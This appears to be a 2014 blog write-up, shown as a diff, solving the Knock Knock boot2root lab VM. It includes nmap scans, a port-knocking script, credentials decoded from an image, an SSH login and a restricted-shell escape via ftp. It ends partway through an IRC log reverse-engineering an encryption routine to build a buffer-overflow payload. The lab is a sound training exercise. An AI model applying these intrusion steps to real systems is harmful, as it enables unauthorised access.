@@ -1,0 +1,732 @@
+---
+author: recrudesce
+comments: false
+date: 2014-10-26 18:42:03+00:00
+layout: post
+slug: knock-knock-whos-there
+title: Knock Knock... Who's There ?
+wordpress_id: 280
+categories:
+- VM's
+tags:
+- boot2root
+- hacking
+- Infosec
+- knock
+- knock knock
+- knockknock
+- Pentesting
+- vm
+---
+
+[zer0w1re](https://twitter.com/zer0w1re) released his first VM, [Knock Knock](http://vulnhub.com/entry/knock-knock-11,105/), so I downloaded it and had a go (truth be told, I tested it before the public release, but this writeup is for the version available on Vulnhub.)
+<!-- more -->
+
+![](http://www.quickmeme.com/img/24/24feb14fa531ddb2c9fbe31c1607f6b71e1dd30c6b5820790e8110da7f8f8d3e.jpg)
+
+
+``` bash
+root@pwk:~# nmap -sS -T5 -p- -O --script banner 172.16.56.139
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-23 18:55 BST
+Nmap scan report for 172.16.56.139
+Host is up (0.00044s latency).
+Not shown: 65534 filtered ports
+PORT     STATE SERVICE
+1337/tcp open  waste
+|_banner: [57154, 48662, 9528]
+MAC Address: 00:0C:29:DE:8D:33 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 3.2, Linux 3.2 - 3.10
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.00 seconds
+root@pwk:~# 
+```
+
+Connecting to port 1337 results in 3 numbers.
+
+``` bash
+root@pwk:~# nc 172.16.56.139 1337
+[56861, 38987, 45887]
+root@pwk:~# 
+```
+
+I guess I'm knocking some ports then.
+NB: in the test version, these 3 ports were in order, in the release version they're randomised. So rather than knocking them in the order returned, we're going to have to write a python script to do all possible port orders. The fun thing here is we don't need to check anything after each knock attempt - we just knock the port numbers in all possible combinations and then check afterwards for any new ports.
+
+I couldn't be bothered to write my own script, so I stole [Leonjza's](https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/), as I was talking to him about it at the time
+
+``` python
+
+#!/usr/bin/python
+
+import socket
+import itertools
+import sys
+
+destination = "192.168.56.203"
+
+def clean_up_ports(raw_string):
+    """ Clean up the raw string received on the socket"""
+    if len(raw_string) <= 0:
+        return None
+
+    # Remove the first [
+    raw_string = raw_string.replace('[','')
+    # Remove the second ]
+    raw_string = raw_string.replace(']','')
+    # split by commas
+    first_list = raw_string.split(',')
+
+    # start e empty return list
+    ports = []
+    for port in first_list:
+        # strip the whitespace around the string
+        # and cast to a integer
+        ports.append(int(port.strip()))
+
+    return  ports
+
+def main():
+    print "[+] Getting sequence"
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((destination, 1337))
+    except Exception as e:
+        print "[+] Unable to connect to %s on port 1337. %s" % (destination, e)
+        sys.exit(1)
+
+    # receive the list
+    raw_list = sock.recv(20)
+
+    # get the ports in a actual python list
+    ports = clean_up_ports(raw_list)
+
+    print "[+] Sequence is %s" % ports
+    print "[+] Knocking on the door using all the possible combinations...\n"
+
+    # Lets knock all of the possible combinations of the ports list
+    for port_list in itertools.permutations(ports):
+
+        print "[+] Knocking with sequence: %s" % (port_list,)
+        for port in port_list:
+            print "[+] Knocking on port %s:%s" % (destination,port)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.1)
+            sock.connect_ex((destination, port))
+            sock.close()
+
+        print "[+] Finished sequence knock\n"
+
+if __name__ == '__main__':
+    print "[+] Knock knock opener"
+    main()
+    print "[+] Done"
+```
+
+He's a clever one :P
+
+``` bash
+root@pwk:~# python knock.py
+[+] Knock knock opener
+[+] Getting sequence
+[+] Sequence is [37430, 5311, 17504]
+[+] Knocking on the door using all the possible combinations...
+
+[+] Knocking with sequence: (37430, 5311, 17504)
+[+] Knocking on port 172.16.56.139:37430
+[+] Knocking on port 172.16.56.139:5311
+[+] Knocking on port 172.16.56.139:17504
+[+] Finished sequence knock
+
+[+] Knocking with sequence: (37430, 17504, 5311)
+[+] Knocking on port 172.16.56.139:37430
+[+] Knocking on port 172.16.56.139:17504
+[+] Knocking on port 172.16.56.139:5311
+[+] Finished sequence knock
+
+[+] Knocking with sequence: (5311, 37430, 17504)
+[+] Knocking on port 172.16.56.139:5311
+[+] Knocking on port 172.16.56.139:37430
+[+] Knocking on port 172.16.56.139:17504
+[+] Finished sequence knock
+
+[+] Knocking with sequence: (5311, 17504, 37430)
+[+] Knocking on port 172.16.56.139:5311
+[+] Knocking on port 172.16.56.139:17504
+[+] Knocking on port 172.16.56.139:37430
+[+] Finished sequence knock
+
+[+] Knocking with sequence: (17504, 37430, 5311)
+[+] Knocking on port 172.16.56.139:17504
+[+] Knocking on port 172.16.56.139:37430
+[+] Knocking on port 172.16.56.139:5311
+[+] Finished sequence knock
+
+[+] Knocking with sequence: (17504, 5311, 37430)
+[+] Knocking on port 172.16.56.139:17504
+[+] Knocking on port 172.16.56.139:5311
+[+] Knocking on port 172.16.56.139:37430
+[+] Finished sequence knock
+
+[+] Done
+root@pwk:~#
+```
+
+Now another NMAP is required to see what opened (if anything)
+
+``` bash
+root@pwk:~/# nmap -sS -T5 --script banner 172.16.56.139
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-23 19:14 BST
+Nmap scan report for 172.16.56.139
+Host is up (0.00025s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+80/tcp open  http
+MAC Address: 00:0C:29:DE:8D:33 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 25.87 seconds
+root@pwk:~/#
+```
+
+The HTTP server is hosting a simple page, which displays an image of a door, and text asking us to look deeper.
+
+[![knockknock_001](http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png)](http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png)
+
+Now, if that's not an invitation to look inside the JPG, then I don't know what is.
+
+``` bash
+root@pwk:~# wget http://172.16.56.139/knockknock.jpg
+--2014-10-23 19:17:39--  http://172.16.56.139/knockknock.jpg
+Connecting to 172.16.56.139:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 84741 (83K) [image/jpeg]
+Saving to: `knockknock.jpg'
+
+100%[======================================================================================================================================================================================================>] 84,741      --.-K/s   in 0s      
+
+2014-10-23 19:17:39 (612 MB/s) - `knockknock.jpg' saved [84741/84741]
+
+root@pwk:~# strings knockknock.jpg
+JFIF
+Ducky
+http://ns.adobe.com/xap/1.0/
+************************************ SNIP ! ************************************
+qW|U
+\+\U
+Login Credentials
+abfnW
+sax2Cw9Ow
+root@pwk:~#
+```
+
+Ooh, some possible credentials. They look like ROT13, so...
+
+``` bash
+root@pwk:~# python rot13.py abfnW
+nosaJ
+root@pwk:~#
+```
+
+OK, that's just Jason reversed, so I guess the same deal for the password.
+
+``` bash
+root@pwk:~# python rot13.py sax2Cw9Ow | rev
+jB9jP2knf
+root@pwk:~#
+```
+
+These credentials can be used to SSH into the VM, which allows us to take a quick look around.
+
+``` bash
+root@pwk:~# ssh jason@172.16.56.139
+jason@172.16.56.139's password: jB9jP2knf
+Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
+jason@knockknock:~$ ls -l
+total 8
+-rwsr-xr-x 1 root jason 7457 Oct 11 18:35 tfc
+jason@knockknock:~$
+```
+
+Looks like we're in a restricted bash shell, so lets escape that quickly
+
+``` bash
+jason@knockknock:~$ ./tfc
+-rbash: ./tfc: restricted: cannot specify `/' in command names
+jason@knockknock:~$ ftp
+ftp> !
+jason@knockknock:~$ ./tfc
+_______________________________
+\__    ___/\_   _____/\_   ___ \
+  |    |    |    __)  /    \  \/
+  |    |    |     \   \     \____
+  |____|    \___  /    \______  /
+                \/            \/ 
+
+	Tiny File Crypter - 1.0
+
+Usage: ./tfc <filein.tfc> <fileout.tfc>
+jason@knockknock:~$ 
+```
+
+OK, so the next part is probably explained a lot better by reading some IRC logs.
+
+``` text
+[2014-10-10T21:51:11+0100] <recrudesce> hey
+[2014-10-10T21:51:18+0100] <recrudesce> so, xcrypt
+[2014-10-10T21:51:36+0100] <c0ne> hey
+[2014-10-10T21:52:09+0100] <recrudesce> i see that the encryption changes based on the length
+[2014-10-10T21:52:28+0100] <recrudesce> so i figure you can send it an ascii string that actually creates a binary
+[2014-10-10T21:52:33+0100] <recrudesce> but it wont be suid, so not possible to run it
+[2014-10-10T21:53:23+0100] <c0ne> as in use tfc to make a file?
+[2014-10-10T21:53:50+0100] <recrudesce> yeah
+[2014-10-10T21:54:01+0100] <recrudesce> cos you can work out what ascii chars will relate to the correct hex values
+[2014-10-10T21:54:04+0100] <recrudesce> was just a thought
+[2014-10-10T21:54:18+0100] <c0ne> hmm it was not intended
+[2014-10-10T21:54:36+0100] <recrudesce> so if i needed a binary that was 3161 3161
+[2014-10-10T21:54:42+0100] <recrudesce> i can just encrypt a1a1
+[2014-10-10T21:54:52+0100] <recrudesce> and it'll create me a output with hex 3161 3161
+[2014-10-10T21:54:58+0100] <recrudesce> just chmod +x it and run it
+[2014-10-10T21:55:07+0100] <recrudesce> i guess i could work out what chars would result in the required hex.
+[2014-10-10T21:55:12+0100] <recrudesce> then encrypt that to generate the binary
+[2014-10-10T21:55:24+0100] <c0ne> could i push you allite bit ahead?
+[2014-10-10T21:55:30+0100] <c0ne> into some other road..
+[2014-10-10T21:55:35+0100] <recrudesce> but what's the point, cos i am only able to run that as jason
+[2014-10-10T21:55:42+0100] <recrudesce> so, it's something to do with xcrypt
+[2014-10-10T21:55:55+0100] <recrudesce> need to send something to xcrypt to make it create, or execute something
+[2014-10-10T21:55:57+0100] <c0ne> its a kinda classic vuln...
+[2014-10-10T21:56:11+0100] <recrudesce> so either buffer overflow or formatstr
+[2014-10-10T21:56:16+0100] <recrudesce> please dont let it be formatstr
+[2014-10-10T21:56:19+0100] <c0ne> first one
+[2014-10-10T21:56:22+0100] <c0ne> simple bof
+[2014-10-10T21:56:27+0100] <c0ne> but...
+[2014-10-10T21:56:55+0100] <c0ne> you need to figure out this xcrypt in order to be able to encrypt your payload
+[2014-10-10T21:57:47+0100] <c0ne> also regarding
+[2014-10-10T21:57:48+0100] <c0ne> [22:52] <recrudesce> i see that the encryption changes based on the length
+[2014-10-10T21:57:55+0100] <c0ne> yes and no...
+[2014-10-10T21:58:12+0100] <c0ne> the key will change depending on the length
+[2014-10-10T22:03:01+0100] <c0ne> basically it's a four byte key created from some init values and changes every time after crypting 4 bytes
+[2014-10-10T22:03:56+0100] <recrudesce> i can make it  segfault by passing it 1000 a's
+[2014-10-10T22:04:00+0100] <recrudesce> but only on the box
+[2014-10-10T22:04:02+0100] <recrudesce> not on my kali
+[2014-10-10T22:05:57+0100] <c0ne> 1000 a's kinda suprisses me
+[2014-10-10T22:06:09+0100] <c0ne> since the buffer is bigger
+[2014-10-10T22:06:21+0100] <recrudesce> i seg faulted it on 1000 a's
+[2014-10-10T22:06:45+0100] <c0ne> k
+[2014-10-10T22:06:51+0100] <c0ne> try something like 5000
+[2014-10-10T22:08:26+0100] <recrudesce> ok, i made it crash
+[2014-10-10T22:08:43+0100] <recrudesce> 725cce63
+[2014-10-10T22:08:48+0100] <recrudesce> but it's not in the pattern cos it's encrypting it
+[2014-10-10T22:08:56+0100] <c0ne> exactly
+[2014-10-10T22:11:35+0100] <recrudesce> you're evil
+[2014-10-10T22:11:45+0100] <c0ne> motherless child
+[2014-10-10T22:12:15+0100] <recrudesce> is the original key based off a static init value
+[2014-10-10T22:12:17+0100] <recrudesce> or a dynamic one
+[2014-10-10T22:12:24+0100] <c0ne> static
+[2014-10-10T22:12:26+0100] <c0ne> also
+[2014-10-10T22:12:31+0100] <recrudesce> so the first key is always the same
+[2014-10-10T22:12:33+0100] <c0ne> xcrypt is one way
+[2014-10-10T22:12:49+0100] <c0ne> so it either encrypts or decrypts
+[2014-10-10T22:14:10+0100] <c0ne> basicly what is does it
+[2014-10-10T22:14:53+0100] <c0ne> creates a 4byte key(dword) crypts a block of 4 bytes(dword) and then changes the key based on another static value
+[2014-10-10T22:15:18+0100] <c0ne> and its keeps changing for every loop round
+[2014-10-10T22:15:47+0100] <recrudesce> so essentially the key is the same on first loop
+[2014-10-10T22:15:52+0100] <recrudesce> and same on 2nd loop ?
+[2014-10-10T22:15:56+0100] <c0ne> also on the next
+[2014-10-10T22:16:00+0100] <c0ne> and so on...
+[2014-10-10T22:16:06+0100] <recrudesce> so no matter what i send it length wise, the 1st key is ALWAYS the same
+[2014-10-10T22:16:09+0100] <recrudesce> and so is the 2nd key
+[2014-10-10T22:16:12+0100] <c0ne> its a simple math mutation
+[2014-10-10T22:16:21+0100] <recrudesce> gotta work out how you generate the 2nd key
+[2014-10-10T22:16:27+0100] <recrudesce> work out what the first key is too
+[2014-10-10T22:16:41+0100] <c0ne> there is only one key
+[2014-10-10T22:16:41+0100] <recrudesce> then you can work out what the algorithm is to generate the keys
+[2014-10-10T22:16:47+0100] <recrudesce> yeah, but you mutate it
+[2014-10-10T22:16:53+0100] <c0ne> thats exactly what you need to do
+[2014-10-10T22:17:16+0100] <c0ne> see how the key is build and mutates
+[2014-10-10T22:18:28+0100] <recrudesce> v3 is the key
+[2014-10-10T22:18:35+0100] <recrudesce> in pseudo-c
+[2014-10-10T22:18:49+0100] <recrudesce> v3 = -367349345
+[2014-10-10T22:19:00+0100] <c0ne> make it hex please
+[2014-10-10T22:20:52+0100] <recrudesce> -0x15E54E61
+[2014-10-10T22:21:24+0100] <c0ne> yeah i just checked it
+[2014-10-10T22:21:30+0100] <c0ne> its the init value indeed
+[2014-10-10T22:21:47+0100] <recrudesce> ok, so the first key is 0x15E54E61 ?
+[2014-10-10T22:21:53+0100] <recrudesce> represented as an unsigned int
+[2014-10-10T22:21:58+0100] <c0ne> no
+[2014-10-10T22:22:05+0100] <c0ne> unsigned indeed
+[2014-10-10T22:22:11+0100] <c0ne> you show signed now
+[2014-10-10T22:22:57+0100] <recrudesce> ah, so signed -367349345 (15E54E61) is EA1AB19F unsigned ?
+[2014-10-10T22:23:04+0100] <c0ne> yes
+[2014-10-10T22:23:06+0100] <c0ne> in ida
+[2014-10-10T22:23:09+0100] <c0ne> press h
+[2014-10-10T22:23:16+0100] <c0ne> when the value selected iirc
+[2014-10-10T22:24:48+0100] <recrudesce> but it shows 3927617951, not -367349345
+[2014-10-10T22:24:54+0100] <recrudesce> or am i being stupid ?
+[2014-10-10T22:25:05+0100] <c0ne> and when you press h again
+[2014-10-10T22:25:19+0100] <recrudesce> EA1AB19F
+[2014-10-10T22:25:24+0100] <recrudesce> but why is the signed different ?
+[2014-10-10T22:26:00+0100] <c0ne> it isnt
+[2014-10-10T22:26:05+0100] <c0ne> its the same value
+[2014-10-10T22:26:26+0100] <recrudesce> ok, i'm confused
+[2014-10-10T22:26:37+0100] <recrudesce> in decompiled it shows as -367349345
+[2014-10-10T22:26:38+0100] <c0ne> open win calc
+[2014-10-10T22:26:52+0100] <c0ne> trow -367349345 in
+[2014-10-10T22:26:57+0100] <c0ne> and switch to hex
+[2014-10-10T22:27:03+0100] <c0ne> you will see
+[2014-10-10T22:27:22+0100] <recrudesce> FFFFFFFEA1AB19F
+[2014-10-10T22:27:30+0100] <c0ne> set it to dword
+[2014-10-10T22:27:38+0100] <c0ne> strips the left 32 bits
+[2014-10-10T22:27:40+0100] <recrudesce> ah ok
+[2014-10-10T22:27:42+0100] <recrudesce> yeah, sorry
+[2014-10-10T22:28:12+0100] <recrudesce> so that's the key in hex which is used as the key for the first 4 bytes
+[2014-10-10T22:28:28+0100] <recrudesce> then something is happening to that hex value to make the next key
+[2014-10-10T22:28:30+0100] <c0ne> its the base value indeed
+[2014-10-10T22:28:35+0100] <c0ne> yes
+[2014-10-10T22:29:31+0100] <recrudesce> ok, so it looks like you're putting that value into ebp+ -0Ch
+[2014-10-10T22:30:25+0100] <recrudesce> looks like you're shifting it by 8
+[2014-10-10T22:30:37+0100] <recrudesce> possibly ?
+[2014-10-10T22:30:52+0100] <c0ne> more like shifting it by 1 , 8 times
+[2014-10-10T22:31:21+0100] <recrudesce> what's the difference between shifting it by 1 8 times or shifting it by 8
+[2014-10-10T22:32:42+0100] <c0ne> a2 >> 2
+[2014-10-10T22:32:48+0100] <c0ne> is the same as
+[2014-10-10T22:32:52+0100] <c0ne> a2 / 4
+[2014-10-10T22:33:09+0100] <recrudesce> ok
+[2014-10-10T22:35:15+0100] <recrudesce> bitwise operations
+[2014-10-10T22:35:24+0100] <c0ne> yes
+[2014-10-10T22:37:29+0100] <recrudesce> so this key, is it used as hex ?
+[2014-10-10T22:37:36+0100] <recrudesce> or converted to something before use ?
+[2014-10-10T22:38:28+0100] <c0ne> hex is only a presentation
+[2014-10-10T22:38:41+0100] <c0ne> if you get me?
+[2014-10-10T22:38:46+0100] <recrudesce> yeah
+[2014-10-10T22:38:58+0100] <recrudesce> i'm just trying to work out how this xcrypt works
+[2014-10-10T22:38:59+0100] <c0ne> its 32 bits value
+[2014-10-10T22:40:14+0100] <c0ne> in assembly you cant realy determ how the value is intended
+[2014-10-10T22:40:31+0100] <c0ne> signed or unsigned
+[2014-10-10T22:40:45+0100] <c0ne> ah signed value ranges from 0 till 80000000
+[2014-10-10T22:41:00+0100] <c0ne> where a unsigned ranges from 0 to ffffffff
+[2014-10-10T22:42:59+0100] <recrudesce> i'm still trying to fathom out this xcrypt func
+[2014-10-10T22:43:06+0100] <c0ne> normally the code kinda tells you how the value was intended
+[2014-10-10T22:43:10+0100] <recrudesce> so it's taking file size, dividing by 4
+[2014-10-10T22:43:13+0100] <recrudesce> looping that many times
+[2014-10-10T22:43:30+0100] <recrudesce> *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
+[2014-10-10T22:43:40+0100] <recrudesce> for ( j = 0; j <= 7; ++j )
+[2014-10-10T22:43:49+0100] <recrudesce> {
+[2014-10-10T22:43:49+0100] <recrudesce>       if ( v3 & 1 )
+[2014-10-10T22:43:49+0100] <recrudesce>         v3 = ((unsigned int)v3 >> 1) ^ 0x6DAA1CF4;
+[2014-10-10T22:43:49+0100] <recrudesce>       else
+[2014-10-10T22:43:49+0100] <recrudesce>         v3 = (unsigned int)v3 >> 1;
+[2014-10-10T22:43:49+0100] <recrudesce>     }
+[2014-10-10T22:43:49+0100] <recrudesce>   }
+[2014-10-10T22:44:02+0100] <c0ne> hmm dress up you ida abit more
+[2014-10-10T22:44:07+0100] <c0ne> for example
+[2014-10-10T22:44:21+0100] <c0ne> select a1 and press y
+[2014-10-10T22:44:25+0100] <c0ne> and change it to
+[2014-10-10T22:44:32+0100] <c0ne> _DWORD *a1
+[2014-10-10T22:44:40+0100] <recrudesce> hang on, i need to find a1
+[2014-10-10T22:44:53+0100] <c0ne> in the function params
+[2014-10-10T22:44:58+0100] <c0ne> int __cdecl xcrypt(_DWORD *a1, unsigned int a2)
+[2014-10-10T22:45:13+0100] <recrudesce> my pseudocode is in a file
+[2014-10-10T22:45:27+0100] <c0ne> aah that wont help then
+[2014-10-10T22:45:31+0100] <recrudesce> ok, now it's in ida
+[2014-10-10T22:45:35+0100] <c0ne> since the rest isnt changed then
+[2014-10-10T22:46:07+0100] <recrudesce> ok, so i did that
+[2014-10-10T22:46:32+0100] <c0ne> [23:43] <recrudesce> *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
+[2014-10-10T22:46:38+0100] <recrudesce> now shows as a1[1] ^= v3
+[2014-10-10T22:46:39+0100] <c0ne> that looks abit better now i think?
+[2014-10-10T22:46:40+0100] <c0ne> yes
+[2014-10-10T22:46:46+0100] <c0ne> hmm
+[2014-10-10T22:46:57+0100] <c0ne> now shows as a1[1] ^= v3 that a 1? in the array?
+[2014-10-10T22:47:06+0100] <recrudesce> sorry, i
+[2014-10-10T22:47:11+0100] <c0ne> k
+[2014-10-10T22:47:12+0100] <recrudesce> a1[i]
+[2014-10-10T22:47:14+0100] <c0ne> i was worried
+[2014-10-10T22:47:31+0100] <c0ne> name that v3 key or so
+[2014-10-10T22:47:39+0100] <c0ne> select > n ..
+[2014-10-10T22:48:03+0100] <recrudesce> name it to "key" ?
+[2014-10-10T22:48:11+0100] <c0ne> yeah or whatever
+[2014-10-10T22:48:16+0100] <c0ne> origenaly its called k
+[2014-10-10T22:48:16+0100] <recrudesce> ok, done
+[2014-10-10T22:48:28+0100] <c0ne> make its sometimes easier to read the whole thing
+[2014-10-10T22:48:53+0100] <recrudesce> k is already in use it seems
+[2014-10-10T22:49:10+0100] <c0ne> then use key :P
+[2014-10-10T22:49:15+0100] <recrudesce> yeah, done it
+[2014-10-10T22:49:53+0100] <recrudesce> {
+[2014-10-10T22:49:53+0100] <recrudesce>       if ( v3 & 1 )
+[2014-10-10T22:49:53+0100] <recrudesce>         v3 = ((unsigned int)v3 >> 1) ^ 0x6DAA1CF4;
+[2014-10-10T22:49:53+0100] <recrudesce>       else
+[2014-10-10T22:49:53+0100] <recrudesce>         v3 = (unsigned int)v3 >> 1;
+[2014-10-10T22:49:53+0100] <recrudesce>     }
+[2014-10-10T22:49:53+0100] <recrudesce>   }
+[2014-10-10T22:49:59+0100] <c0ne> so with the last bit of code stripped
+[2014-10-10T22:50:05+0100] <c0ne> its kinda looks simple right?
+[2014-10-10T22:50:08+0100] <recrudesce> yup, that's what i have
+[2014-10-10T22:50:34+0100] <c0ne> so for every loop 0..7 it does a math check on the last key value
+[2014-10-10T22:50:37+0100] <c0ne> the and 1
+[2014-10-10T22:50:50+0100] <c0ne> and so chooses how the mutate the key
+[2014-10-10T22:51:28+0100] <c0ne> try porting this into python or what you like
+[2014-10-10T22:53:13+0100] <recrudesce> cant i just do this in C and make it echo the keys ?
+[2014-10-10T22:53:22+0100] <c0ne> sure
+[2014-10-10T22:53:26+0100] <recrudesce> rather than return 0, printf(key) ?
+[2014-10-10T22:53:38+0100] <c0ne> but python is just as easy
+[2014-10-10T22:53:45+0100] <c0ne> hmm now sure if you want that
+[2014-10-10T22:53:51+0100] <c0ne> but yes i think is possible
+[2014-10-10T22:54:02+0100] <recrudesce> ok, lets work this through in python
+[2014-10-10T22:54:03+0100] <c0ne> but you will flood your screen
+[2014-10-10T22:55:32+0100] <recrudesce> ok, so a1 is the content of the file
+[2014-10-10T22:55:37+0100] <recrudesce> and a2 is the length of the file ?
+[2014-10-10T22:55:38+0100] <c0ne> yes
+[2014-10-10T22:55:41+0100] <c0ne> yes
+[2014-10-10T22:56:56+0100] <recrudesce> ok, so i need to pass my python script a file
+[2014-10-10T22:57:01+0100] <recrudesce> get the contents of it
+[2014-10-10T22:57:04+0100] <recrudesce> and the length
+[2014-10-10T22:57:56+0100] <c0ne> thats a way indeed
+[2014-10-10T22:58:14+0100] <c0ne> easier is to generate the data youself
+[2014-10-10T22:58:25+0100] <c0ne> data = 5000 * 'A'
+[2014-10-10T22:59:05+0100] <recrudesce> ok, so a1 = 5000 * 'A'
+[2014-10-10T22:59:07+0100] <recrudesce> a2 = 5000
+[2014-10-10T22:59:19+0100] <recrudesce> key = -367349345
+[2014-10-10T22:59:41+0100] <c0ne> go for the signed
+[2014-10-10T22:59:47+0100] <c0ne>         key = ((unsigned int)key >> 1) ^ 0x6DAA1CF4;
+[2014-10-10T22:59:47+0100] <c0ne>       else
+[2014-10-10T22:59:47+0100] <c0ne>         key = (unsigned int)key >> 1;
+[2014-10-10T22:59:54+0100] <c0ne> sorry unsigned
+[2014-10-10T23:00:02+0100] <c0ne> the code tells you how its intended
+[2014-10-10T23:15:14+0100] <recrudesce> so i have
+[2014-10-10T23:15:22+0100] <recrudesce> key = 0xEA1AB19F
+[2014-10-10T23:15:35+0100] <recrudesce> for i in range (0,a2/4,1) :
+[2014-10-10T23:15:44+0100] <recrudesce>      print a1[i] ^ key
+[2014-10-10T23:15:48+0100] <recrudesce> throws an error
+[2014-10-10T23:15:56+0100] <recrudesce> TypeError: unsupported operand type(s) for ^: 'str' and 'long'
+[2014-10-10T23:15:57+0100] <c0ne> yeah of course
+[2014-10-10T23:16:02+0100] <c0ne> exactly
+[2014-10-10T23:16:02+0100] <recrudesce> so i guess i have to cast key as long ?
+[2014-10-10T23:16:07+0100] <c0ne> no
+[2014-10-10T23:16:20+0100] <c0ne> your data, you don't treat is a integer
+[2014-10-10T23:16:24+0100] <recrudesce> or cast my string as long ?
+[2014-10-10T23:16:26+0100] <c0ne> str xor integer
+[2014-10-10T23:16:50+0100] <c0ne> struct lib can help you
+[2014-10-10T23:17:02+0100] <recrudesce> so i need to work out how to convert my string to an int
+[2014-10-10T23:17:08+0100] <recrudesce> convert an A to an int :/
+[2014-10-10T23:17:42+0100] <c0ne> x = struct.unpack_from('<L', a1, (i * 4))
+[2014-10-10T23:17:43+0100] <c0ne> or so
+[2014-10-10T23:17:47+0100] <c0ne> in the loop
+[2014-10-10T23:18:22+0100] <recrudesce> <L ?
+[2014-10-10T23:18:46+0100] <c0ne> little endian indeed
+[2014-10-10T23:19:07+0100] <recrudesce> ok, so now i get tuple and long
+[2014-10-10T23:19:21+0100] <c0ne> sorry
+[2014-10-10T23:19:22+0100] <recrudesce> rather than string and long :P
+[2014-10-10T23:19:25+0100] <c0ne>  x = struct.unpack_from('<L', a1, (i * 4))[0]
+[2014-10-10T23:19:27+0100] <c0ne> better
+[2014-10-10T23:19:50+0100] <recrudesce> ah ok
+[2014-10-10T23:19:52+0100] <recrudesce> cool
+[2014-10-10T23:20:06+0100] <c0ne> btw
+[2014-10-10T23:20:07+0100] <c0ne> for i in range (0,a2/4,1) :
+[2014-10-10T23:20:14+0100] <c0ne> how does this works?
+[2014-10-10T23:20:21+0100] <recrudesce> a2 is the length
+[2014-10-10T23:20:23+0100] <recrudesce> 0 is start
+[2014-10-10T23:20:26+0100] <recrudesce> 1 is step
+[2014-10-10T23:20:29+0100] <c0ne> aah ok
+[2014-10-10T23:20:34+0100] <recrudesce> so it'll step 1 from 0 to a2/4
+[2014-10-10T23:20:43+0100] <c0ne> which is the same as
+[2014-10-10T23:20:46+0100] <recrudesce> which is essentially what you're doing with v
+[2014-10-10T23:20:47+0100] <recrudesce>  for ( i = 0; a2 >> 2 > i; ++i )
+[2014-10-10T23:20:52+0100] <c0ne> range(a2/4)
+[2014-10-10T23:20:58+0100] <recrudesce> yeah, could do that too
+[2014-10-10T23:21:04+0100] <c0ne> it confused me
+[2014-10-10T23:21:57+0100] <recrudesce> if ( key & 1 )
+[2014-10-10T23:22:00+0100] <recrudesce> wossat doing ?
+[2014-10-10T23:22:22+0100] <c0ne> check a bit is true or false
+[2014-10-10T23:22:22+0100] <recrudesce> bitwise and
+[2014-10-10T23:23:33+0100] <c0ne> >>> for i in range(10):
+[2014-10-10T23:23:34+0100] <c0ne> ...     print (i & 1)
+[2014-10-10T23:23:34+0100] <c0ne> ...
+[2014-10-10T23:23:34+0100] <c0ne> 0
+[2014-10-10T23:23:34+0100] <c0ne> 1
+[2014-10-10T23:23:34+0100] <c0ne> 0
+[2014-10-10T23:23:34+0100] <c0ne> 1
+[2014-10-10T23:23:35+0100] <c0ne> 0
+[2014-10-10T23:23:35+0100] <c0ne> 1
+[2014-10-10T23:23:36+0100] <c0ne> 0
+[2014-10-10T23:23:36+0100] <c0ne> 1
+[2014-10-10T23:23:37+0100] <c0ne> 0
+[2014-10-10T23:23:37+0100] <c0ne> 1
+[2014-10-10T23:28:36+0100] <c0ne> now there where you do
+[2014-10-10T23:28:37+0100] <c0ne> print x ^ key
+[2014-10-10T23:28:59+0100] <c0ne> you could pack the result into a str again and append it to some output buffer
+[2014-10-10T23:29:17+0100] <c0ne> something like
+[2014-10-10T23:29:21+0100] <c0ne> outside the loop
+[2014-10-10T23:29:24+0100] <c0ne> r = ''
+[2014-10-10T23:29:50+0100] <recrudesce> outside which loop - the first or the 2nd ?
+[2014-10-10T23:29:52+0100] <c0ne> replace the print with r += struct.pack('<L', (x ^ key))
+[2014-10-10T23:30:14+0100] <c0ne> out of the main loop
+[2014-10-10T23:30:23+0100] <c0ne> since you have the declare a clean buffer
+[2014-10-10T23:30:26+0100] <c0ne> empty
+[2014-10-10T23:31:10+0100] <recrudesce> ok, done
+[2014-10-10T23:31:18+0100] <recrudesce> then at the end, print r ?
+[2014-10-10T23:31:22+0100] <recrudesce> after the entire loop
+[2014-10-10T23:31:23+0100] <c0ne> yes
+[2014-10-10T23:31:27+0100] <c0ne> or!
+[2014-10-10T23:31:42+0100] <c0ne> open('myfile.tfc', 'wb').write( r )
+[2014-10-10T23:31:52+0100] <c0ne> so you have it in the file
+[2014-10-10T23:32:11+0100] <c0ne> you need it in a file anyways 
+[2014-10-10T23:32:26+0100] <recrudesce> ok, i just encrypted 5000 A's
+[2014-10-10T23:32:36+0100] <recrudesce> and it looks like it did it
+[2014-10-10T23:33:00+0100] <c0ne> feed it to the binary
+[2014-10-10T23:33:06+0100] <c0ne> and see what happens
+[2014-10-10T23:33:21+0100] <recrudesce> seg fault
+[2014-10-10T23:33:32+0100] <c0ne> on..
+[2014-10-10T23:34:01+0100] <recrudesce> 0x4f04c41c
+[2014-10-10T23:34:14+0100] <c0ne> hmm
